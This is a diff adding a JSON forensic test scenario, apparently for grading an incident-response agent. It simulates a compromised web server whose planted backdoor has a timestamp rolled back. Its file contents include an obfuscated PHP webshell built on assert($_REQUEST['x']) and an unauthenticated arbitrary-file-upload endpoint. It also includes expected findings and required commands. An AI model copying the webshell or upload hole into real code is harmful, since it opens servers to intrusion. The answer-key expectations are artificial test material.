@@ -1,0 +1,176 @@
+{
+  "id": "timestamp-tampering",
+  "title": "时间戳篡改识别：mtime 很早但 ctime 很新",
+  "category": "boundary",
+  "investigation_mode": "free_form",
+  "clients": [
+    {
+      "id": "1",
+      "os": "linux/amd64",
+      "address": "203.0.113.70:43310",
+      "online": true,
+      "note": "web03",
+      "host": {
+        "hostname": "web03",
+        "now": "2026-06-14T10:30:00+08:00",
+        "timezone": "Asia/Shanghai",
+        "timezone_name": "CST",
+        "uname": "Linux web03 3.10.0-1160.71.1.el7.x86_64 #1 SMP Tue Jun 28 15:37:28 UTC 2022 x86_64 GNU/Linux",
+        "uptime": " 10:30:02 up 154 days,  9:03,  1 user,  load average: 0.51, 0.48, 0.44",
+        "wtmp_begins": "Sun May 17 03:00:02 2026",
+        "files": [
+          {
+            "path": "/var/www/html/inc/config.php",
+            "user": "www-data",
+            "group": "www-data",
+            "uid": 33,
+            "gid": 33,
+            "mtime": "2019-05-11T09:22:14+08:00",
+            "ctime": "2019-05-11T09:22:14+08:00",
+            "atime": "2026-06-14T09:00:02+08:00",
+            "md5": "1a0c47e93b5d8261fa0e73c9d4b28e16",
+            "lines": [
+              "<?php",
+              "define('DB_HOST', '10.0.7.9');",
+              "define('DB_NAME', 'shop');"
+            ]
+          },
+          {
+            "path": "/var/www/html/inc/config_bak.php",
+            "user": "www-data",
+            "group": "www-data",
+            "uid": 33,
+            "gid": 33,
+            "mtime": "2019-05-11T09:22:14+08:00",
+            "ctime": "2026-06-14T02:31:09+08:00",
+            "atime": "2026-06-14T02:33:40+08:00",
+            "md5": "e4c1b90a7f2d6538ba91c0e5d7f34a82",
+            "file_type": "PHP script, ASCII text",
+            "lines": [
+              "<?php",
+              "$f='ass'.'ert';",
+              "@$f($_REQUEST['x']);"
+            ]
+          },
+          {
+            "path": "/var/www/html/inc/db.php",
+            "user": "www-data",
+            "group": "www-data",
+            "uid": 33,
+            "gid": 33,
+            "mtime": "2019-05-11T09:22:14+08:00",
+            "ctime": "2019-05-11T09:22:14+08:00",
+            "atime": "2026-06-13T18:11:00+08:00",
+            "md5": "27f1a0b9c8d3e4562a7f019bc3d84e50",
+            "lines": [
+              "<?php",
+              "require_once __DIR__.'/config.php';"
+            ]
+          },
+          {
+            "path": "/var/www/html/admin/upload.php",
+            "user": "www-data",
+            "group": "www-data",
+            "uid": 33,
+            "gid": 33,
+            "mtime": "2021-03-08T11:40:00+08:00",
+            "ctime": "2021-03-08T11:40:00+08:00",
+            "atime": "2026-06-14T02:31:07+08:00",
+            "md5": "77b1e0d4a3f2c95681e0a4b7c2d35f19",
+            "lines": [
+              "<?php",
+              "// admin file manager, auth check disabled for maintenance",
+              "move_uploaded_file($_FILES['f']['tmp_name'], $_POST['dir'].'/'.$_FILES['f']['name']);"
+            ]
+          },
+          {
+            "path": "/var/log/nginx/access.log",
+            "user": "root",
+            "mtime": "2026-06-14T10:29:00+08:00",
+            "lines": [
+              "10.0.7.4 - - [14/Jun/2026:01:50:11 +0800] \"GET /index.php HTTP/1.1\" 200 8102 \"-\" \"Mozilla/5.0\"",
+              "203.0.113.201 - - [14/Jun/2026:02:30:41 +0800] \"GET /admin/upload.php HTTP/1.1\" 200 402 \"-\" \"curl/8.4.0\"",
+              "203.0.113.201 - - [14/Jun/2026:02:31:07 +0800] \"POST /admin/upload.php HTTP/1.1\" 200 27 \"-\" \"curl/8.4.0\"",
+              "203.0.113.201 - - [14/Jun/2026:02:33:40 +0800] \"POST /inc/config_bak.php HTTP/1.1\" 200 1841 \"-\" \"curl/8.4.0\"",
+              "203.0.113.201 - - [14/Jun/2026:02:41:22 +0800] \"POST /inc/config_bak.php HTTP/1.1\" 200 96 \"-\" \"curl/8.4.0\"",
+              "10.0.7.4 - - [14/Jun/2026:09:00:02 +0800] \"GET /index.php HTTP/1.1\" 200 8102 \"-\" \"Mozilla/5.0\""
+            ]
+          }
+        ],
+        "processes": [
+          {"pid": 1, "ppid": 0, "user": "root", "cpu": 0.0, "mem": 0.1, "vsz": 191216, "rss": 4110, "stat": "Ss", "start": "Jan11", "time": "14:02", "cmd": "/usr/lib/systemd/systemd --switched-root --system"},
+          {"pid": 870, "ppid": 1, "user": "root", "cpu": 0.0, "mem": 0.1, "vsz": 112904, "rss": 4290, "stat": "Ss", "start": "Jan11", "time": "0:22", "cmd": "/usr/sbin/sshd -D"},
+          {"pid": 1004, "ppid": 1, "user": "root", "cpu": 0.0, "mem": 0.2, "vsz": 125412, "rss": 6200, "stat": "Ss", "start": "Jan11", "time": "2:40", "cmd": "nginx: master process /usr/sbin/nginx"},
+          {"pid": 1201, "ppid": 1, "user": "www-data", "cpu": 0.8, "mem": 2.9, "vsz": 688104, "rss": 118400, "stat": "Ssl", "start": "Jan11", "time": "44:12", "cmd": "php-fpm: pool www"}
+        ],
+        "connections": [
+          {"proto": "tcp", "local": "0.0.0.0:22", "remote": "0.0.0.0:*", "state": "LISTEN", "pid": 870, "program": "sshd"},
+          {"proto": "tcp", "local": "0.0.0.0:80", "remote": "0.0.0.0:*", "state": "LISTEN", "pid": 1004, "program": "nginx"},
+          {"proto": "tcp", "local": "10.0.7.11:41880", "remote": "10.0.7.9:3306", "state": "ESTABLISHED", "pid": 1201, "program": "php-fpm"}
+        ],
+        "logins": [
+          {"user": "ops", "tty": "pts/0", "from": "10.0.0.9", "start": "Sat Jun 13 15:11", "end": "15:52", "duration": "00:41"}
+        ],
+        "failed_logins": [],
+        "crontabs": {
+          "root": []
+        },
+        "package_verify": []
+      }
+    }
+  ],
+  "faults": [],
+  "expectation": {
+    "verdict": "confirmed_intrusion_with_timestomp",
+    "confidence_ceiling": "confirmed",
+    "must_conclude": [
+      "config_bak.php 的 mtime 停在 2019-05-11 但 ctime 是 2026-06-14 02:31:09，是时间戳被回改的典型特征（T1070.006）",
+      "同目录 config.php / db.php 的 mtime 与 ctime 一致，说明 2019 这个时间不是目录整体的属性",
+      "以 ctime 为准建立时间线：02:31:07 攻击者 203.0.113.201 POST /admin/upload.php，02:31:09 文件落地，02:33:40 起被调用",
+      "入口是 admin/upload.php 未做鉴权的任意文件上传"
+    ],
+    "must_not_conclude": [
+      "该文件 mtime 为 2019 年，属历史遗留文件，与本次事件无关",
+      "只用 -newermt 做时间窗筛查就断定近期无新增文件",
+      "把 mtime 直接写进时间线"
+    ],
+    "required_evidence": [
+      {
+        "client": "1",
+        "command": "stat /var/www/html/inc/config_bak.php",
+        "must_contain": ["Modify: 2019-05-11 09:22:14", "Change: 2026-06-14 02:31:09"]
+      },
+      {
+        "client": "1",
+        "command": "stat /var/www/html/inc/config.php",
+        "must_contain": ["Modify: 2019-05-11 09:22:14", "Change: 2019-05-11 09:22:14"]
+      },
+      {
+        "client": "1",
+        "command": "find /var/www/html/inc -type f -name '*.php' -newermt '2026-06-14 00:00'",
+        "must_not_contain": ["config_bak.php"]
+      },
+      {
+        "client": "1",
+        "command": "grep -n '02:31:07' /var/log/nginx/access.log",
+        "must_contain": ["203.0.113.201", "POST /admin/upload.php", "200"]
+      },
+      {
+        "client": "1",
+        "command": "grep -c 'config_bak.php' /var/log/nginx/access.log",
+        "must_contain": ["2"]
+      },
+      {
+        "client": "1",
+        "command": "cat /var/www/html/inc/config_bak.php",
+        "must_contain": ["$_REQUEST"]
+      },
+      {
+        "client": "1",
+        "command": "ls -l /var/www/html/inc",
+        "must_contain": ["config_bak.php", "2019"]
+      }
+    ],
+    "notes": "负向能力用例：时间戳篡改。第三条探针刻意展示 -newermt 的盲区——只按 mtime 筛时间窗会漏掉被 touch 回改的文件，必须回到 ctime 交叉核对。"
+  }
+}
